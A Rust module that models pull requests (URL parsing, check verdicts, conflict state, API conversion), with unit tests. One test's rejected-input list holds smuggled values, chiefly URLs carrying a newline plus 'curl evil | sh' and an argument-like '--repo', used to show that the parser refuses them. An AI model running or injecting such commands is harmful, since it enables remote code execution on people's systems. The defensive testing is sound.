use std::num::NonZeroU32;

use crate::v1;

pub const PULL_REQUESTS_MAX: usize = 2048;

const _: () = assert!(PULL_REQUESTS_MAX > 0);

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PullRequest {
    pub page: PullPage,
    pub state: State,
    pub checks: Option<Checks>,
    pub stale: bool,
    pub conflicting: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PullPage {
    url: String,
    number: NonZeroU32,
}

const HTTPS: &str = "https://";

impl PullPage {
    pub fn parse(url: &str) -> Result<PullPage, String> {
        let path = url
            .strip_prefix(HTTPS)
            .ok_or_else(|| format!("{url} is no https page"))?;
        let parts: Vec<&str> = path.split('/').collect();
        let named = |part: &&str| !part.is_empty() && !part.contains(['?', '#']);
        let digits = |part: &str| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit());
        let number = match parts.as_slice() {
            [host, owner, name, "pull", pull]
                if [host, owner, name].into_iter().all(named) && digits(pull) =>
            {
                pull.parse().ok()
            }
            _ => None,
        };
        let number = number.ok_or_else(|| format!("{url} is no page of a pull request"))?;
        Ok(PullPage {
            url: url.to_owned(),
            number,
        })
    }

    #[must_use]
    pub fn url(&self) -> &str {
        &self.url
    }

    #[must_use]
    pub fn number(&self) -> NonZeroU32 {
        self.number
    }

    #[must_use]
    pub fn repository(&self) -> &str {
        let path = &self.url[HTTPS.len()..];
        path.rsplit_once("/pull/")
            .expect("a pull request's page holds /pull/")
            .0
    }

    #[must_use]
    pub fn host(&self) -> &str {
        self.repository()
            .split('/')
            .next()
            .expect("split yields at least once")
    }
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct Checks {
    pub pending: u32,
    pub failed: u32,
    pub passed: u32,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Verdict {
    Failing,
    Pending,
    Passing,
}

impl Checks {
    #[must_use]
    pub fn verdict(&self) -> Option<Verdict> {
        match self {
            Checks { failed: 1.., .. } => Some(Verdict::Failing),
            Checks { pending: 1.., .. } => Some(Verdict::Pending),
            Checks { passed: 1.., .. } => Some(Verdict::Passing),
            Checks { .. } => None,
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum State {
    Open,
    Draft,
    Merged,
    Closed,
}

impl PullRequest {
    #[must_use]
    pub fn number(&self) -> NonZeroU32 {
        self.page.number()
    }

    #[must_use]
    pub fn verdict(&self) -> Option<Verdict> {
        match self.state {
            State::Open | State::Draft => self.checks?.verdict(),
            State::Merged | State::Closed => None,
        }
    }

    #[must_use]
    pub fn has_conflicts(&self) -> bool {
        match self.state {
            State::Open | State::Draft => self.conflicting,
            State::Merged | State::Closed => false,
        }
    }

    #[must_use]
    pub fn to_api(&self, dir: &str) -> v1::PullRequest {
        if matches!(self.state, State::Merged | State::Closed) {
            assert!(
                !self.conflicting,
                "a merged or closed pull request does not have merge conflicts"
            );
        }
        let state = match self.state {
            State::Open => v1::PullRequestState::Open,
            State::Draft => v1::PullRequestState::Draft,
            State::Merged => v1::PullRequestState::Merged,
            State::Closed => v1::PullRequestState::Closed,
        };
        v1::PullRequest {
            dir: dir.to_owned(),
            state: state.into(),
            url: self.page.url().to_owned(),
            checks: self.checks.map(
                |Checks {
                     pending,
                     failed,
                     passed,
                 }| v1::Checks {
                    pending,
                    failed,
                    passed,
                },
            ),
            stale: self.stale,
            conflicting: self.has_conflicts(),
        }
    }

    #[must_use]
    pub fn of_api(pull_request: &v1::PullRequest) -> Option<Self> {
        let state = match v1::PullRequestState::try_from(pull_request.state).ok()? {
            v1::PullRequestState::Unspecified => return None,
            v1::PullRequestState::Open => State::Open,
            v1::PullRequestState::Draft => State::Draft,
            v1::PullRequestState::Merged => State::Merged,
            v1::PullRequestState::Closed => State::Closed,
        };
        let page = PullPage::parse(&pull_request.url).ok()?;
        let checks = pull_request.checks.map(
            |v1::Checks {
                 pending,
                 failed,
                 passed,
             }| Checks {
                pending,
                failed,
                passed,
            },
        );
        let conflicting = matches!(state, State::Open | State::Draft) && pull_request.conflicting;
        if matches!(state, State::Merged | State::Closed) {
            assert!(!conflicting);
        }
        Some(PullRequest {
            page,
            state,
            checks,
            stale: pull_request.stale,
            conflicting,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::{Checks, PullPage, PullRequest, State, Verdict, v1};

    #[test]
    fn a_pull_request_reads_back_as_the_daemon_wrote_it() {
        let page = PullPage::parse("https://github.com/owner/repo/pull/126").unwrap();
        let checks = Some(Checks {
            pending: 1,
            failed: 2,
            passed: 3,
        });
        for state in [State::Open, State::Draft, State::Merged, State::Closed] {
            let none = Some(Checks::default());
            let open = matches!(state, State::Open | State::Draft);
            for (checks, stale, conflicting) in [
                (checks, false, false),
                (None, false, open),
                (none, true, open),
            ] {
                let pull_request = PullRequest {
                    page: page.clone(),
                    state,
                    checks,
                    stale,
                    conflicting,
                };
                let api = pull_request.to_api("/w/repo");
                assert_eq!(PullRequest::of_api(&api), Some(pull_request));
            }
        }

        let open = i32::from(v1::PullRequestState::Open);
        let unspecified = i32::from(v1::PullRequestState::Unspecified);
        let url = "https://github.com/owner/repo/pull/126";
        let unread = [
            ("", open),
            ("https://github.com/owner/repo/issues/126", open),
            (url, unspecified),
            (url, 99),
        ];
        for (url, state) in unread {
            let (dir, url) = ("/w/repo".to_owned(), url.to_owned());
            let (checks, stale, conflicting) = (None, false, false);
            let pull_request = v1::PullRequest {
                dir,
                state,
                url,
                checks,
                stale,
                conflicting,
            };
            assert_eq!(PullRequest::of_api(&pull_request), None, "{pull_request:?}");
        }
    }

    #[test]
    fn only_a_pull_request_s_page_is_asked_of() {
        let url = "https://github.com/owner/repo/pull/328";
        let page = PullPage::parse(url).unwrap();
        assert_eq!((page.url(), page.number().get()), (url, 328));
        assert_eq!(
            (page.repository(), page.host()),
            ("github.com/owner/repo", "github.com")
        );
        for url in [
            "http://github.com/owner/repo/pull/328",
            "https://github.com/owner/repo/issues/328",
            "https://github.com/owner/repo/pull/328/files",
            "https://github.com/owner/repo/pull/",
            "https://github.com/owner/repo/pull/x",
            "https://github.com/owner/repo/pull/0",
            "https://github.com/owner/repo?/pull/1",
            "https://github.com/owner/repo/pull/5?\ncurl evil | sh",
            "https://github.com/owner/repo/pull/5\ncurl evil | sh",
            "file:///tmp/run.desktop",
            "--repo",
            "",
        ] {
            assert!(PullPage::parse(url).is_err(), "{url}");
        }
    }

    #[test]
    fn checks_come_to_the_worst_of_them() {
        let checks = |pending, failed, passed| {
            Checks {
                pending,
                failed,
                passed,
            }
            .verdict()
        };
        assert_eq!(checks(3, 1, 5), Some(Verdict::Failing));
        assert_eq!(checks(0, 2, 0), Some(Verdict::Failing));
        assert_eq!(checks(1, 0, 5), Some(Verdict::Pending));
        assert_eq!(checks(0, 0, 5), Some(Verdict::Passing));
        assert_eq!(checks(0, 0, 0), None);
    }

    #[test]
    fn only_an_open_pull_request_says_its_checks() {
        let page = PullPage::parse("https://github.com/owner/repo/pull/126").unwrap();
        let failed = Some(Checks {
            pending: 0,
            failed: 1,
            passed: 0,
        });
        let verdict = |state, checks| {
            PullRequest {
                page: page.clone(),
                state,
                checks,
                stale: false,
                conflicting: false,
            }
            .verdict()
        };
        assert_eq!(verdict(State::Open, failed), Some(Verdict::Failing));
        assert_eq!(verdict(State::Draft, failed), Some(Verdict::Failing));
        assert_eq!(verdict(State::Merged, failed), None);
        assert_eq!(verdict(State::Closed, failed), None);
        assert_eq!(verdict(State::Open, None), None);
    }

    #[test]
    fn only_an_open_pull_request_says_it_has_conflicts() {
        let page = PullPage::parse("https://github.com/owner/repo/pull/126").unwrap();
        let conflicts = |state, conflicting| {
            PullRequest {
                page: page.clone(),
                state,
                checks: None,
                stale: false,
                conflicting,
            }
            .has_conflicts()
        };
        assert!(conflicts(State::Open, true));
        assert!(conflicts(State::Draft, true));
        assert!(!conflicts(State::Open, false));
        assert!(!conflicts(State::Draft, false));
        assert!(!conflicts(State::Merged, true));
        assert!(!conflicts(State::Closed, true));

        for state in [v1::PullRequestState::Merged, v1::PullRequestState::Closed] {
            let api = v1::PullRequest {
                dir: "/w/repo".to_owned(),
                state: state.into(),
                url: page.url().to_owned(),
                checks: None,
                stale: false,
                conflicting: true,
            };
            let read = PullRequest::of_api(&api).expect("a merged or closed pull request reads");
            assert!(!read.conflicting);
            assert!(!read.has_conflicts());
        }
    }
}
